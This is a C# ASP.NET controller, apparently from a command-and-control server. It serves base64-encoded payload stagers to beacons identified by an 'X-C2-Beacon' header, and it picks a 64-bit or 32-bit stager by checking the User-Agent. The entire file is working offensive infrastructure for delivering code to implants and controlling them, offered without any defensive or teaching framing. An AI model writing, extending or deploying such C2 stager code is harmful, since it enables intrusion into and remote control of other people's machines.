using System;
using System.IO;
using ClientC2;
using ClientC2.channels;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;

namespace ServerC2
{
  
    [Route("/stager")]
    public class StagerController : Controller
    {
        private const string IdHeader = "X-C2-Beacon";
        private readonly ChannelManager<SocketChannel> _manager;
        private readonly SocketSettings _settings;

        public StagerController(IOptions<SocketSettings> settings, ChannelManager<SocketChannel> manager)
        {
            _settings = settings.Value;
            _manager = manager;
        }

        [HttpPost]
        public string Post()
        {
            var is64Bit = HttpContext.Request.Headers["User-Agent"].ToString().Contains("x64;");
            var beacon = GetBeacon();
            var stager = beacon.socket.GetStager(beacon.id.ToString(), is64Bit);

            return Convert.ToBase64String(stager);
        }
        private (Guid id, SocketChannel socket) GetBeacon()
        {
            var headers = HttpContext.Request.Headers;
            var beaconId = headers.ContainsKey(IdHeader)
                ? Guid.Parse(headers[IdHeader])
                : Guid.Empty;

            return (beaconId, _manager.GetChannelById(new BeaconId { InternalId = beaconId }));
        }
    }
}